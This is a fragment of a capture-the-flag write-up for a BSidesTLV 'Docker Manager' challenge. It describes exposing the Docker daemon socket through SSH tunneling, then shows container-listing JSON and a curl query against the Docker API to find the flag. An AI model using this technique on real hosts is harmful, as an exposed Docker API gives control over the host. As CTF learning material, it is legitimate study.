...
Indeed! using SSH Tunneling we can expose the [Docker Deamon Socket](https://docs.docker.[AWS_SECRET_REMOVED]/#daemon-socket-option) which allows using the Docker API.
...
[
    {
        ...
        "Id": "[AWS_SECRET_REMOVED]7e8cfdb7becc27cc59ed3f1d",
        "Image": "docker-manager_challenge",
        "ImageID": "sha256:[AWS_SECRET_REMOVED]e01e66c9643f7dbe0c3ad8f7",
        "Labels": {
            "com.docker.compose.config-hash": "[AWS_SECRET_REMOVED]93d1f715eafab117973e436c",
            ...
            "com.docker.compose.project.working_dir": "[AWS_SECRET_REMOVED]rfiles/docker-manager/api/docker-manager",
        ...
        "Mounts": [
            {
                ...
                "RW": true,
                "Source": "/run/desktop/mnt/host/wsl/docker-desktop-bind-mounts/Ubuntu-20.[AWS_SECRET_REMOVED]c52ba9376c4a99f4505c494cf5b",
                "Type": "bind"
            }
        ],
        "Names": [
        ...
        "NetworkSettings": {
            "Networks": {
                "docker-manager_default": {
                    "Aliases": null,
                    "DriverOpts": null,
                    "EndpointID": "[AWS_SECRET_REMOVED]f4f279d9ee1a761397871179",
                    "Gateway": "172.29.0.1",
                    "GlobalIPv6Address": "",
                    ...
                    "NetworkID": "[AWS_SECRET_REMOVED]497c8ab0fd0cbc3029616c4e"
                }
            }
        },
        "Ports": [
...
```console
root@kali:/media/sf_CTFs/bsidestlv/Docker_Manager/docker# curl -s http://localhost:[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]/json | python3 -m json.tool | grep -i bsides
